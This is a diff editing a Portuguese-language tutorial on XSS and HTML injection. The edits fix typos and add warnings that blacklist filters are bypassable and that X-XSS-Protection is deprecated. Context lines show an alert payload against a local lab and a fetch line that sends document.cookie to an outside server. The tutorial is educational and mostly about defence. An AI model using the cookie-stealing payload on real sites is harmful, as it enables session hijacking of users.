@@ -2,8 +2,8 @@
 title: XSS e HTML Injection - Tipos e Exploração
 description: 'Entendendo Cross-Site Scripting: Reflected, Stored e DOM-based XSS com exemplos práticos'
 author: matheus
-tags: ["XSS", "web security", "javascript", "vulnerability", "pentesting", "Stored XSS", "Reflected XSS", "DOM-based XSS", "HTML Injection"]
-categories: ["SecLab", "WayOfSec", "Hacking", "Write Ups"]
+tags: ["XSS", "HTML Injection", "web security", "JavaScript", "pentesting", "CSP", "DOMPurify"]
+categories: ["Segurança", "Web Security"]
 pin: false
 comments: true
 
@@ -138,11 +138,11 @@ O SVG é HTML válido e o `onload` executa assim que o elemento carrega. Muitos 
 - **Whitespace**: Quebra regex mal feitos
 - **Unicode**: Representa caracteres de forma alternativa
 
-**Na prática:** Essas técnicas de obfuscação são amplamente documentadas em plataformas como OWASP e relatórios de bug bounty - como os da hackerone -, sendo encontradas frequentemente nessas pesquisas de segurança.
+**Na prática:** Essas técnicas de obfuscação são amplamente documentadas em plataformas como OWASP e relatórios de bug bounty - como os da HackerOne -, sendo encontradas frequentemente nessas pesquisas de segurança.
 
 ### Explorando na prática
 
-Melhores formas para praticar seria criando a própria máquina vulnerável para entender como é feito, usar o site [phpvuln](http://testphp.vulnweb.com/) e as máquinas de plataformas como tryhackme, hackthebox e até a própria hackingclub - que é o que usarei para neste documento. Outras plataformas excelentes serão recomendadas no final do documento, algumas valem MUITO a pena, viu?
+Melhores formas para praticar seria criando a própria máquina vulnerável para entender como é feito, usar o site [testphp.vulnweb.com (Acunetix)](http://testphp.vulnweb.com/) e as máquinas de plataformas como tryhackme, hackthebox e até a própria hackingclub - que é o que usarei para neste documento. Outras plataformas excelentes serão recomendadas no final do documento, algumas valem MUITO a pena, viu?
 
 Máquina criada localmente para simular XSS:
 
@@ -162,7 +162,7 @@ if (isset($_GET['q']) && !empty($_GET['q'])) {
 ?>
 ```
 ```
-http://localhost:8888/index.php?q=<scrip>alert('XSS!!')</script>
+http://localhost:8888/index.php?q=<script>alert('XSS!!')</script>
 ```
 
 O navegador vê `<script>` como código legítimo → executa → alert aparece.
@@ -229,7 +229,7 @@ fetch('http://meuservidor.com/roubar.php?cookie=' + document.cookie)
 - **Persistente** - Sua payload fica lá funcionando 24/7 até alguém descobrir e remover
 - **Escala real** - Se for um site popular, você pode afetar milhares de pessoas
 
-Enquanto em um deles você precisa fazer engenharia social para convencer a pessoa a beber a água do copo, no outro você envenenou a fonte para que qualquer pessoa que beber, incluíndo seu alvo, irá ser afetada.
+Enquanto em um deles você precisa fazer engenharia social para convencer a pessoa a beber a água do copo, no outro você envenenou a fonte para que qualquer pessoa que beber, incluindo seu alvo, irá ser afetada.
 
 ### Exemplo prático
 
@@ -300,7 +300,7 @@ Então logo o código vulnerável foi encontrado:
 
 Um resumo rápido do que encontramos é o fato do front-end estar alterando o conteúdo da variável, o que queremos pesquisar está dentro de `searchMessage` e o maior problema está no `innerHTML` sem sanitização, permitindo injeção de payload XSS.
 
-**Testando injeção no paramertro da url:**
+**Testando injeção no parâmetro da url:**
 ```html
 ?search=<b style="color: red">texto vermelho</b>
 ```
@@ -436,6 +436,9 @@ Agora que você sabe como explorar XSS, vamos ver como se defender de verdade. �
 ### Backend: A primeira linha de defesa
 
 **PHP - Sanitização inteligente:**
+
+> ⚠️ **Exemplo do que NÃO fazer.** Os filtros por blacklist abaixo (bloquear palavras como `script`, `eval`, regex de `on\w+=`, etc.) são **frágeis e bypassáveis** — estão aqui só para você entender *por que* falham. A defesa correta é **escape contextual na saída** + **DOMPurify** + **CSP**, mostrada mais adiante.
+{: .prompt-warning }
 
 ```php
 <?php
@@ -663,9 +666,12 @@ Header always set X-XSS-Protection "1; mode=block"
 Header always set Content-Security-Policy "default-src 'self'; script-src 'self'"
 ```
 
+> **Nota:** `X-XSS-Protection` está **deprecado** e foi removido dos navegadores modernos (pode até introduzir problemas). Hoje a proteção real vem do **CSP** — recomenda-se `X-XSS-Protection: 0` ou simplesmente não depender dele.
+{: .prompt-warning }
+
 ### Entendendo as camadas de defesa (e por que frontend sozinho não basta)
 
-Você tocou num ponto importante: se a proteção está no frontend, não dá para contornar? **Sim, dá.** Por isso defesa em camadas é fundamental.
+Um ponto importante: se a proteção está só no frontend, dá para contorná-la? **Sim, dá.** Por isso defesa em camadas é fundamental.
 
 A **primeira camada** é o backend - sanitização e validação no servidor. Essa não pode ser burlada pelo usuário e protege contra Reflected e Stored XSS. Funciona mesmo se o JavaScript do navegador estiver desabilitado.
 
@@ -751,6 +757,10 @@ function sanitizarHTML(html) {
 ```
 
 **Sanitização frontend contra obfuscação:**
+
+> ⚠️ **Exemplo do que NÃO fazer.** Os filtros por blacklist abaixo (bloquear palavras como `script`, `eval`, regex de `on\w+=`, etc.) são **frágeis e bypassáveis** — estão aqui só para você entender *por que* falham. A defesa correta é **escape contextual na saída** + **DOMPurify** + **CSP**, mostrada mais adiante.
+{: .prompt-warning }
+
 ```javascript
 function sanitizar_completo_anti_obfuscacao(input) {
     // Decodifica HTML entities primeiro
@@ -791,20 +801,6 @@ function sanitizar_completo_anti_obfuscacao(input) {
     
     // Remove caracteres unicode suspeitos
     input = input.replace(/\\u[0-9a-fA-F]{4}/g, '');
-    
-    return input;
-}
-    input = input.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
-    
-    // Remove javascript: protocol
-    input = input.replace(/javascript:/gi, '');
-    
-    // Remove tags perigosas
-    const tagsPerigosas = ['script', 'iframe', 'object', 'embed', 'form'];
-    tagsPerigosas.forEach(tag => {
-        const regex = new RegExp('<' + tag + '\\b[^>]*>', 'gi');
-        input = input.replace(regex, '');
-    });
     
     return input;
 }
@@ -919,6 +915,9 @@ X-XSS-Protection: 1; mode=block
 Strict-Transport-Security: max-age=31536000; includeSubDomains
 ```
 
+> **Nota:** `X-XSS-Protection` está **deprecado** e foi removido dos navegadores modernos (pode até introduzir problemas). Hoje a proteção real vem do **CSP** — recomenda-se `X-XSS-Protection: 0` ou simplesmente não depender dele.
+{: .prompt-warning }
+
 ### Escape por contexto: Lugar certo, proteção certa
 
 Cada lugar da página precisa de escape diferente:
@@ -1003,7 +1002,7 @@ O **DVWA** (Damn Vulnerable Web Application) é clássico e muito bom pra começ
 
 **A regra de ouro:** Se você conseguir injetar HTML (tipo `<b>negrito</b>`), provavelmente consegue injetar JavaScript também. É só questão de criatividade para burlar os filtros.
 
-**Dica de ouro:** Sempre teste primeiro com HTML simples. Se funcionar, escalade para JavaScript. Se não funcionar, não perca tempo com payloads complexos.
+**Dica de ouro:** Sempre teste primeiro com HTML simples. Se funcionar, escale para JavaScript. Se não funcionar, não perca tempo com payloads complexos.
 
 **Flags capturadas nos testes:**
 
